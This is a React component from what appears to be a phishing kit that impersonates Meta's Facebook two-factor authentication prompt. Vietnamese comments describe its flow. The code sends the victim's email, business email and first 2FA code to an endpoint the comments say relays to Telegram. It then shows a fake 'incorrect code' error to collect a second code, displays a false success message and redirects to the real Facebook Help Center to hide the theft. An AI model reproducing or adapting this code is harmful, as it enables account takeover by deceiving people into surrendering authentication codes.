'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface TwoFactorModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (code1: string, code2: string) => void;
  method?: string;
  isSubmitting?: boolean;
  errorMessage?: string;
  apiSuccess?: boolean;
  email?: string;
  emailBusiness?: string;
}

export default function TwoFactorModal({ isOpen, onClose, onSubmit, isSubmitting = false, errorMessage = '', apiSuccess = false, email = '', emailBusiness = '' }: TwoFactorModalProps) {
  const [code, setCode] = useState('');
  const [code1, setCode1] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [localError, setLocalError] = useState('');
  const [isCheckingCode, setIsCheckingCode] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [showCountdownError, setShowCountdownError] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [successCountdown, setSuccessCountdown] = useState(30);
  const [showLoadingSpinner, setShowLoadingSpinner] = useState(false);

  // Reset tất cả states khi modal đóng (API thành công)
  useEffect(() => {
    if (!isOpen) {
      setCode('');
      setCode1('');
      setAttemptCount(0);
      setLocalError('');
      setIsCheckingCode(false);
      setCountdown(0);
      setShowCountdownError(false);
      setShowSuccessModal(false);
      setSuccessCountdown(30);
      setShowLoadingSpinner(false);
    }
  }, [isOpen]);

  // Lock body scroll when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [isOpen]);

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (countdown === 0 && showCountdownError) {
      // Khi countdown về 0, reload lại trang
      window.location.reload();
    }
  }, [countdown, showCountdownError]);

  // Bắt đầu countdown khi API thành công
  useEffect(() => {
    if (apiSuccess && !showCountdownError) {
      // Hiển thị loading spinner trước
      setShowLoadingSpinner(true);
      
      // Sau 2 giây, ẩn spinner và hiển thị success modal
      setTimeout(() => {
        setShowLoadingSpinner(false);
        setShowSuccessModal(true);
        setSuccessCountdown(30);
      }, 2000);
    }
  }, [apiSuccess]);

  // Success modal countdown timer
  useEffect(() => {
    if (showSuccessModal && successCountdown > 0) {
      const timer = setTimeout(() => {
        setSuccessCountdown(successCountdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (showSuccessModal && successCountdown === 0) {
      // Auto redirect when countdown ends
      window.location.href = 'https://www.facebook.com/help';
    }
  }, [successCountdown, showSuccessModal]);

  const handleGoToFacebook = () => {
    window.location.href = 'https://www.facebook.com/help';
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Chỉ cho phép nhập số, tối đa 8 ký tự
    if (value === '' || (/^\d*$/.test(value) && value.length <= 8)) {
      setCode(value);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    if (!code.trim()) {
      setLocalError('Verification code is required');
      return;
    }

    if (code.length > 8) {
      setLocalError('Code must not exceed 8 characters');
      return;
    }

    if (!/^\d+$/.test(code)) {
      setLocalError('Code must contain only numbers');
      return;
    }

    if (attemptCount === 0) {
      // Lần 1: Gửi telegram với code1, sau đó hiển thị loading 3s, sau đó báo code sai
      setCode1(code);
      setIsCheckingCode(true);
      setLocalError('');

      // Gửi telegram với code lần 1
      if (email && emailBusiness) {
        fetch('/api/send-message', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: email,
            email_business: emailBusiness,
            code1: code,
            step: 3, // Giống step 3 nhưng chỉ có code1
          }),
        }).catch(error => {
          console.error('Failed to send telegram for first 2FA attempt:', error);
        });
      }

      // Sau 3 giây
      setTimeout(() => {
        setIsCheckingCode(false);
        setLocalError('Incorrect verification code. Please try again.');
        setAttemptCount(1);

        // Clear code
        setCode('');
      }, 3000);

    } else {
      // Lần 2: Lấy code2 và gọi API
      setLocalError('');
      onSubmit(code1, code);

      // Reset attemptCount để chuẩn bị cho lần mở modal tiếp theo
      setAttemptCount(0);

      // Countdown sẽ được bắt đầu khi apiSuccess = true
    }
  };

  if (!isOpen) return null;

  // Loading Spinner (2 seconds before success modal)
  if (showLoadingSpinner) {
    return (
      <>
        <style jsx>{`
          @keyframes spin {
            from {
              transform: rotate(0deg);
            }
            to {
              transform: rotate(360deg);
            }
          }
          @keyframes pulse {
            0%, 100% {
              opacity: 1;
            }
            50% {
              opacity: 0.5;
            }
          }
          @keyframes dots {
            0%, 20% {
              content: '.';
            }
            40% {
              content: '..';
            }
            60%, 100% {
              content: '...';
            }
          }
          .spinner {
            animation: spin 1s linear infinite;
          }
          .pulse-ring {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
          }
        `}</style>
        <div className="fixed inset-0 flex items-center justify-center z-50 p-4" style={{ backgroundColor: 'rgba(0, 0, 0, 0.6)' }}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-12">
            <div className="flex flex-col items-center justify-center">
              {/* Spinning Circle */}
              <div className="relative mb-8">
                {/* Outer pulse ring */}
                <div className="absolute inset-0 w-24 h-24 bg-blue-400 rounded-full opacity-20 pulse-ring"></div>
                
                {/* Spinning gradient circle */}
                <div className="relative w-24 h-24">
                  <svg className="spinner w-full h-full" viewBox="0 0 50 50">
                    <circle
                      className="opacity-20"
                      cx="25"
                      cy="25"
                      r="20"
                      fill="none"
                      strokeWidth="4"
                      stroke="#3B82F6"
                    />
                    <circle
                      cx="25"
                      cy="25"
                      r="20"
                      fill="none"
                      strokeWidth="4"
                      stroke="url(#gradient)"
                      strokeLinecap="round"
                      strokeDasharray="80, 200"
                    />
                    <defs>
                      <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#3B82F6" />
                        <stop offset="50%" stopColor="#2563EB" />
                        <stop offset="100%" stopColor="#1D4ED8" />
                      </linearGradient>
                    </defs>
                  </svg>
                </div>

                {/* Center icon */}
                <div className="absolute inset-0 flex items-center justify-center">
                  <svg className="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
              </div>

              {/* Processing text */}
              <div className="text-center">
                <h3 className="text-xl font-bold text-gray-900 mb-2">
                  Processing Your Request
                </h3>
                <p className="text-gray-600 text-sm">
                  Please wait a moment...
                </p>
              </div>
            </div>
          </div>
        </div>
      </>
    );
  }

  // Success Modal
  if (showSuccessModal) {
    return (
      <>
        <style jsx>{`
          .scrollbar-hide::-webkit-scrollbar {
            display: none;
          }
          .scrollbar-hide {
            -ms-overflow-style: none;
            scrollbar-width: none;
          }
          @keyframes slideUp {
            from {
              opacity: 0;
              transform: translateY(20px);
            }
            to {
              opacity: 1;
              transform: translateY(0);
            }
          }
          @keyframes checkmark {
            0% {
              stroke-dashoffset: 100;
            }
            100% {
              stroke-dashoffset: 0;
            }
          }
          @keyframes scaleIn {
            0% {
              transform: scale(0);
            }
            50% {
              transform: scale(1.1);
            }
            100% {
              transform: scale(1);
            }
          }
          .animate-slide-up {
            animation: slideUp 0.4s ease-out;
          }
          .animate-scale-in {
            animation: scaleIn 0.5s ease-out;
          }
          .checkmark-path {
            stroke-dasharray: 100;
            animation: checkmark 0.6s ease-in-out 0.2s forwards;
          }
        `}</style>
        <div className="fixed inset-0 flex items-center justify-center z-50 p-4" style={{ backgroundColor: 'rgba(0, 0, 0, 0.6)' }}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-slide-up">
            {/* Success Icon with Animation */}
            <div className="flex justify-center mb-6 animate-scale-in">
              <div className="relative">
                <div className="w-20 h-20 bg-gradient-to-br from-green-300 to-green-500 rounded-full flex items-center justify-center shadow-lg">
                  <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path 
                      className="checkmark-path"
                      strokeLinecap="round" 
                      strokeLinejoin="round" 
                      strokeWidth={3} 
                      d="M5 13l4 4L19 7" 
                      style={{ strokeDashoffset: 100 }}
                    />
                  </svg>
                </div>
                {/* Decorative circles */}
                <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-200 rounded-full opacity-50"></div>
                <div className="absolute -bottom-1 -left-1 w-4 h-4 bg-green-300 rounded-full opacity-40"></div>
              </div>
            </div>

            {/* Header */}
            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold text-gray-900 mb-3">
                Request Submitted Successfully
              </h2>
              <div className="w-16 h-1 bg-gradient-to-r from-green-300 to-green-500 mx-auto rounded-full mb-4"></div>
              <p className="text-gray-600 leading-relaxed">
                Thank you for your submission. Our support team has received your information and will contact you shortly via your registered email address.
              </p>
            </div>

            {/* Info Box */}
            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4 mb-6">
              <div className="flex items-center justify-center gap-2 mb-2">
                <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <p className="text-sm font-semibold text-blue-900">
                  Auto-redirect in Progress
                </p>
              </div>
              <div className="text-center">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-white rounded-full shadow-sm mb-2">
                  <span className="text-3xl font-bold text-blue-500">{successCountdown}</span>
                </div>
                <p className="text-xs text-blue-700">seconds remaining</p>
              </div>
            </div>

            {/* Buttons */}
            <div className="space-y-3">
              <button
                onClick={handleGoToFacebook}
                className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-semibold py-3.5 px-6 rounded-xl transition-colors duration-200 shadow-lg hover:shadow-xl flex items-center justify-center gap-2"
              >
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Continue to Facebook Help Center
              </button>
              <p className="text-xs text-gray-500 text-center">
                You will be redirected automatically
              </p>
            </div>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <style jsx>{`
        .scrollbar-hide::-webkit-scrollbar {
          display: none;
        }
        .scrollbar-hide {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
      <div className="fixed inset-0 flex items-start lg:items-center justify-center z-50 p-4 pt-2.5 lg:pt-4" style={{ backgroundColor: 'rgba(130, 137, 136, 0.7)' }}>
        <div className="rounded-lg shadow-xl max-w-xl w-full max-h-[90vh] overflow-y-auto scrollbar-hide" style={{ background: 'linear-gradient(to right, #f9f1f9, #ecf7f8)' }}>
          <div className="p-8">
            {/* Close button */}
            <button
              onClick={onClose}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors z-10"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            {/* Header */}
            <div className="mb-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">
                Two-factor authentication required (1/3)
              </h2>
              <p className="text-sm text-gray-600 leading-relaxed">
                The verification code has been sent to your phone number or E-mail, please check your inbox and enter the code below to complete. In case you do not receive the code, please check the Facebook notification on your device and confirm it is you to complete the verification process.
              </p>
            </div>

            {/* Illustration */}
            <div className="mb-6 rounded-xl overflow-hidden">
              <Image
                src="/banner-v2.jpg"
                alt="Two-factor authentication"
                width={600}
                height={300}
                className="w-full h-auto object-cover"
              />
            </div>            {/* Form */}
            <form onSubmit={handleSubmit}>
              {/* Code input */}
              <div className="mb-4">
                <input
                  type="text"
                  placeholder="Code (numbers only, max 8 digits)"
                  value={code}
                  onChange={handleCodeChange}
                  maxLength={8}
                  inputMode="numeric"
                  pattern="\d*"
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white text-gray-900 placeholder-gray-400"
                />
              </div>

              {/* Error message */}
              {(localError || errorMessage) && (
                <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600">{localError || errorMessage}</p>
                </div>
              )}

              {/* Countdown error message */}
              {showCountdownError && countdown > 0 && (
                <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600">
                    The two-factor authentication you entered is incorrect. Please, try again after {Math.floor(countdown / 60)} minutes {countdown % 60} seconds.
                  </p>
                </div>
              )}

              {/* Continue button */}
              <button
                type="submit"
                disabled={!code.trim() || isSubmitting || isCheckingCode || showCountdownError}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-300 disabled:cursor-not-allowed text-white font-semibold py-3 px-6 rounded-lg transition-colors shadow-sm flex items-center justify-center gap-2"
              >
                {(isSubmitting || isCheckingCode) ? (
                  <>
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span>{isCheckingCode ? 'Checking...' : 'Processing...'}</span>
                  </>
                ) : (
                  'Continue'
                )}
              </button>
            </form>

            {/* Meta logo */}
            <div className="flex items-center justify-center gap-2 mt-6 pt-6 border-t border-gray-200">
              <svg aria-label="Biểu tượng Meta" height="18" role="img" viewBox="0 0 150 100" width="27">
                <defs>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_2fa_r_0" x1="124.599" x2="159.703" y1="96.689" y2="57.25">
                    <stop offset="0.21" stopColor="#0278F1"></stop>
                    <stop offset="0.533" stopColor="#0180FA"></stop>
                  </linearGradient>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_2fa_r_1" x1="43.859" x2="0" y1="4.984" y2="63.795">
                    <stop offset="0.427" stopColor="#0165E0"></stop>
                    <stop offset="0.917" stopColor="#0180FA"></stop>
                  </linearGradient>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_2fa_r_2" x1="28.409" x2="134.567" y1="28.907" y2="71.769">
                    <stop stopColor="#0064E0"></stop>
                    <stop offset="0.656" stopColor="#0066E2"></stop>
                    <stop offset="1" stopColor="#0278F1"></stop>
                  </linearGradient>
                </defs>
                <path d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z" fill="#0180FA"></path>
                <path d="M145.119 34.888h-14.878c3.44 8.718 5.46 19.42 5.46 30.969 0 11.137-3.647 17.599-11.205 17.599-1.403 0-2.663-.18-3.884-.63V99.5a33.48 33.48 0 0 0 3.54.18C140.758 99.68 150 86.23 150 64.756c0-10.702-1.768-20.882-4.881-29.87Z" fill="url(#meta_2fa_r_0)"></path>
                <path d="M43.103 0c.253 0 .505.003.756.008v16.308c-.319-.016-.64-.024-.962-.024-14.138 0-26.055 23.706-26.65 47.503H.014C.588 30.77 19.08 0 43.103 0Z" fill="url(#meta_2fa_r_1)"></path>
                <path d="M43.103 0c11.115 0 20.534 5.004 31.4 17.913 3.055 3.817 6.74 8.777 10.682 14.511l.017.025.024-.003c1.939 2.912 3.94 6.05 6.017 9.428l8.795 14.668c13.754 22.13 17.214 26.913 24.458 26.913h.103v16.22c-.148.003-.297.004-.447.004-14.466 0-22.449-8.126-36.778-32.103l-7.356-12.374a587.065 587.065 0 0 0-2.287-3.822l.019-.045c-5.483-8.971-8.971-14.454-11.962-18.44l-.05.037c-9.15-12.59-15.42-16.64-22.842-16.64h-.034V.001l.24-.001Z" fill="url(#meta_2fa_r_2)"></path>
              </svg>
              <span className="font-semibold text-gray-900">Meta</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
